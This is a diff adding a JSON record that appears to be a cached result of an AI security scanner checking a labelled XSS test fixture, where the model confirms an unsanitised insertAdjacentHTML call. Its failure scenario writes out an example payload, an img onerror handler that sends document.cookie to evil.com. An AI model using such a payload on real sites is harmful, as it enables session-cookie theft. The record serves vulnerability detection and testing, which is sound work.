@@ -1,0 +1,8 @@
+{
+  "key": "67df380b1d50ec8d84cbfef5da1fafa7",
+  "file": "positive/xss/insert-adjacent-html-fragment.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [8],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"Untrusted HTML fragment is inserted into the DOM via insertAdjacentHTML without sanitization, allowing script execution.\",\n    \"rationale\": \"The function receives a parameter explicitly named 'untrustedFragment' and passes it directly to insertAdjacentHTML() on line 8 with no escaping or sanitization. The file comment confirms this is assembled from search-result snippets. insertAdjacentHTML parses its string argument as HTML, executing any scripts or event handlers present in the markup.\",\n    \"failureScenario\": \"An attacker provides a search-result snippet containing '<img src=x onerror=\\\"fetch(\\\\'https://evil.com/steal?c=\\\\'+document.cookie)\\\">'. When appendSearchResult is called with this fragment, insertAdjacentHTML parses and inserts the img tag, triggering the onerror handler which exfiltrates the user's session cookie to the attacker's server.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.946Z",
+  "elapsedMs": 19861.581153018178
+}
